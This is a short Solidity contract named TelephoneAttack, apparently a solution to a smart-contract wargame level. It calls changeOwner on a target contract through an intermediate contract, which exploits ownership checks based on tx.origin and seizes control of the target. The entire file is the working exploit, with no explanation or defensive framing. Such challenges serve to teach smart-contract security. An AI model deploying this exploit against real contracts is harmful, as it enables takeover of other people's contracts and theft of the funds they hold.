// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

contract TelephoneAttack {
    error UhOh();
    
    function exploit(address telephoneContract) external {
        (bool success, ) = telephoneContract.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
        if (!success) {
            revert UhOh();
        }
    }
}